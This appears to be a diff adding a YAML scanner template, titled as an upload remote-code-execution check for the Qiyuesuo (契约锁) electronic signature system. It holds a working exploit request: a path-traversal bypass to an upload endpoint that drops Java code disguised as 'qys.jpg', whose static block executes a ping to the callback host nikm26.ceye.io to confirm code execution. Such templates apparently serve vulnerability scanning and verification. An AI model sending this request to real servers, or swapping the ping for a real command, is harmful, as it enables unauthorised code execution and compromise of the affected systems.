@@ -1,0 +1,14 @@
+name: 契约锁电子签章系统-uoload-RCE
+description: >-
+  执行：ping nikm26.ceye.io查看反连平台
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /callback/%2E%2E;/code/upload
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R
+    body: "------WebKitFormBoundaryco2lQ5vxCOn9Aq2R\r\nContent-Disposition: form-data; name=\"type\";\r\n\r\nTIMETASK\r\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R\r\nContent-Disposition: form-data; name=\"file\";filename=\"qys.jpg\"\r\n\r\npackage qiyuesuo;\r\n\r\nimport com.qiyuesuo.utask.java.BaseTimerTask;\r\n\r\npublic class qiyuesuo004 extends BaseTimerTask {\r\n    static {try{Runtime.getRuntime().exec(\"ping nikm26.ceye.io\");}catch (Exception e){}}\r\n}\r\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--"
+    expression:
+      status: 200
+      body_all: ["result"]
